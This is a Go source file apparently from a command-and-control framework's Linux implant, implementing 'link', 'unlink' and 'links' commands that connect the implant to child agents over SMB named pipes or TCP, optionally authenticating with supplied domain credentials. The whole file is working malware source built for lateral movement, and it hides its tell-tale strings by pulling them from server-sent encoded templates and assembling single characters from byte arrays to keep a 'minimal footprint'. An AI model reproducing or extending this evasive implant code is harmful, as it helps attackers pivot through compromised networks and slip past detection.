// server/docker/payloads/Linux/action_link.go
// Link commands for connecting to SMB and TCP child agents

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"time"
)

// LinkTemplate matches the server's CommandTemplate structure
type LinkTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxLinkProtoSmb     = 120
	idxLinkProtoTcp     = 121
	idxLinkUncSlashes   = 122
	idxLinkPipePath     = 123
	idxLinkLocalhost    = 124
	idxLinkLoopback     = 125
	idxLinkDefaultPort  = 126
	idxLinkStatusPrefix = 127
	idxLinkPingMarker   = 128
	idxLinkQuitMarker   = 129
	idxLinkDot          = 132
)

// Single-char byte arrays (innocuous, minimal footprint)
var (
	lnkColon     = string([]byte{0x3a}) // :
	lnkBackslash = string([]byte{0x5c}) // \
	lnkPipe      = string([]byte{0x7c}) // |
)

// LinkCommand handles the 'link' command for connecting to SMB and TCP agents
type LinkCommand struct {
	tpl *LinkTemplate
}

// getTpl safely retrieves a template string by index
func (c *LinkCommand) getTpl(idx int) string {
	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
		return c.tpl.Templates[idx]
	}
	return ""
}

func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
	if err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	c.tpl = &LinkTemplate{}
	if err := json.Unmarshal(decoded, c.tpl); err != nil {
		return CommandResult{
			Output:      Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store template for link_manager.go to use
	if c.tpl.Templates != nil {
		SetLinkManagerTemplate(c.tpl.Templates)
	}

	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case c.getTpl(idxLinkProtoSmb):
		if len(args) < 3 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		pipeName := args[2]

		// Parse optional credentials: args[3] = DOMAIN\user, args[4] = password
		var creds *SMBCredentials
		if len(args) >= 5 {
			userStr := args[3]
			password := args[4]

			// Parse DOMAIN\user format
			var domain, user string
			if strings.Contains(userStr, lnkBackslash) {
				parts := strings.SplitN(userStr, lnkBackslash, 2)
				domain = parts[0]
				user = parts[1]
			} else {
				// No domain specified, use "." for local
				user = userStr
				domain = c.getTpl(idxLinkDot)
			}

			creds = &SMBCredentials{
				Domain:   domain,
				User:     user,
				Password: password,
			}
		}

		// Handle localhost specially - use "." for local machine
		localhost := c.getTpl(idxLinkLocalhost)
		loopback := c.getTpl(idxLinkLoopback)
		dot := c.getTpl(idxLinkDot)
		if strings.ToLower(targetHost) == localhost || targetHost == loopback {
			targetHost = dot
		}

		// Build the full UNC pipe path
		uncSlashes := c.getTpl(idxLinkUncSlashes)
		pipePath := c.getTpl(idxLinkPipePath)
		fullPipePath := uncSlashes + targetHost + pipePath + pipeName
		return c.linkSMB(fullPipePath, creds)

	case c.getTpl(idxLinkProtoTcp):
		port := c.getTpl(idxLinkDefaultPort)
		if len(args) >= 3 {
			port = args[2]
		}

		// Build the TCP address
		address := targetHost + lnkColon + port
		return c.linkTCP(address)

	default:
		return CommandResult{
			Output:      ErrCtx(E32, protocol),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *LinkCommand) linkSMB(pipePath string, creds *SMBCredentials) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link with credentials (creds can be nil for anonymous)
	routingID, err := lm.Link(pipePath, creds)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E33, pipePath) + lnkPipe + err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	handshakeResult := c.performImmediateHandshake(lm, routingID)

	statusPrefix := c.getTpl(idxLinkStatusPrefix)
	return CommandResult{
		Output:      statusPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *LinkCommand) linkTCP(address string) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link
	routingID, err := lm.LinkTCP(address)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E33, address) + lnkPipe + err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	handshakeResult := c.performImmediateHandshake(lm, routingID)

	statusPrefix := c.getTpl(idxLinkStatusPrefix)
	return CommandResult{
		Output:      statusPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
func (c *LinkCommand) performImmediateHandshake(lm *LinkManager, routingID string) string {
	// Wait briefly for the SMB/TCP agent's handshake to arrive in the handshake queue
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *LinkDataOut
	for time.Now().Before(deadline) {
		// Check handshake queue for handshake data (sent via "lh" field)
		data := lm.GetHandshakeData()
		if data != nil && data.RoutingID == routingID {
			handshakeData = data
			break
		}
		// Re-queue any handshake that wasn't for us
		if data != nil {
			lm.queueHandshakeData(data)
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		return c.getTpl(idxLinkPingMarker)
	}

	// Queue the handshake data to be sent via "lh" field on next POST to server
	lm.queueHandshakeData(handshakeData)
	return c.getTpl(idxLinkQuitMarker)
}

// UnlinkCommand handles the 'unlink' command for disconnecting from SMB/TCP agents
type UnlinkCommand struct{}

func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := GetLinkManager()

	if err := lm.Unlink(routingID); err != nil {
		return CommandResult{
			Output:      ErrCtx(E34, routingID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S7, routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// LinksCommand handles the 'links' command for listing active SMB/TCP links
type LinksCommand struct{}

func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	lm := GetLinkManager()
	output := lm.ListLinks()

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
